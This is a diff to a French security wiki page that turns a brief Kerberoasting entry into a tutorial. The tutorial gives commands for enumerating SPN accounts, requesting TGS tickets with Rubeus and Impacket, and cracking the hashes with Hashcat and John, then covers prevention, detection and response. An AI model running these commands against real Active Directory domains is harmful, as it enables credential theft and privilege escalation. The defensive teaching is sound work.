@@ -4,21 +4,97 @@ date: '2025-07-14'
 draft: false
 ---
 
+# 🔥 Kerberoasting
 
+## Qu'est-ce que le Kerberoasting ?
 
+Le **Kerberoasting** est une technique d'attaque Active Directory qui consiste à demander des tickets de service Kerberos (TGS) pour des comptes de service, puis à tenter de casser le hash du mot de passe hors-ligne. Cette attaque permet à un attaquant ayant un accès authentifié au domaine d'obtenir des mots de passe de comptes à privilèges.
 
-Le **Kerberoasting** est une technique d’attaque Active Directory qui consiste à demander des tickets de service Kerberos (TGS) pour des comptes de service, puis à tenter de casser le hash du mot de passe hors-ligne.  
-Cette attaque permet à un attaquant ayant un accès authentifié au domaine d’obtenir des mots de passe de comptes à privilèges.
+## 🎯 Objectif de l'attaque
 
-**Étapes principales :**
-- Lister les comptes de service disposant d’un SPN.
-- Demander un ticket TGS pour ces comptes.
-- Extraire le hash du ticket.
-- Craquer le hash pour obtenir le mot de passe en clair.
+L'objectif principal est d'extraire des hashes de mots de passe de comptes de service (Service Accounts) qui utilisent souvent des mots de passe faibles ou réutilisés, permettant ainsi une élévation de privilèges dans l'environnement Active Directory.
 
-**Contre-mesures :**
-- Utiliser des mots de passe forts pour les comptes de service.
-- Surveiller les requêtes TGS inhabituelles.
-- Limiter les droits des comptes de service.
+## 📋 Étapes de l'attaque
 
-*Voir aussi : [Kerberoasting sur HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting)*
+### 1. Énumération des comptes de service
+
+Identifier les comptes de service disposant d'un SPN (Service Principal Name) :
+
+```powershell
+# Avec PowerView
+Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
+
+# Avec AD Module
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
+### 2. Demande de tickets TGS
+
+Demander des tickets Kerberos pour les comptes de service identifiés :
+
+```powershell
+# Avec Rubeus
+Rubeus.exe kerberoast /user:serviceaccount /outfile:hashes.txt
+
+# Avec Impacket
+python3 GetUserSPNs.py -request domain.local/user:password
+```
+
+### 3. Extraction des hashes
+
+Extraire les hashes des tickets obtenus pour analyse hors-ligne.
+
+### 4. Craquage des hashes
+
+Utiliser des outils comme Hashcat ou John the Ripper pour casser les mots de passe :
+
+```bash
+# Avec Hashcat
+hashcat -m 13100 -a 0 hash.txt wordlist.txt
+
+# Avec John the Ripper
+john --wordlist=wordlist.txt hash.txt
+```
+
+## 🛡️ Contre-mesures
+
+### Prévention
+
+- **Mots de passe forts** : Utiliser des mots de passe complexes et uniques pour tous les comptes de service
+- **Rotation régulière** : Implémenter une politique de rotation des mots de passe
+- **Principe du moindre privilège** : Limiter les droits des comptes de service au strict nécessaire
+- **Groupes de sécurité** : Utiliser des groupes dédiés pour les comptes de service
+
+### Détection
+
+- **Surveillance des requêtes TGS** : Monitorer les demandes de tickets inhabituelles
+- **Logs d'audit** : Activer l'audit détaillé des événements Kerberos
+- **Alertes SIEM** : Configurer des alertes pour les patterns suspects
+- **Analyse comportementale** : Détecter les activités anormales des comptes de service
+
+### Réponse
+
+- **Isolation immédiate** : Isoler les comptes compromis
+- **Changement de mots de passe** : Forcer le changement de tous les mots de passe concernés
+- **Analyse forensique** : Investiguer l'étendue de la compromission
+- **Documentation** : Documenter l'incident et les leçons apprises
+
+## 🔧 Outils populaires
+
+| Outil | Description | Plateforme |
+|-------|-------------|------------|
+| **Rubeus** | Outil C# pour l'exploitation Kerberos | Windows |
+| **Impacket** | Collection d'outils Python | Multi-plateforme |
+| **PowerView** | Module PowerShell pour l'énumération AD | Windows |
+| **Hashcat** | Craqueur de hashes haute performance | Multi-plateforme |
+| **John the Ripper** | Craqueur de mots de passe classique | Multi-plateforme |
+
+## 📚 Ressources supplémentaires
+
+- [Guide complet sur HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting)
+- [Documentation Microsoft sur Kerberos](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
+- [OWASP Active Directory Security](https://owasp.org/www-project-active-directory-security/)
+
+---
+
+*Dernière mise à jour : 14 juillet 2025*
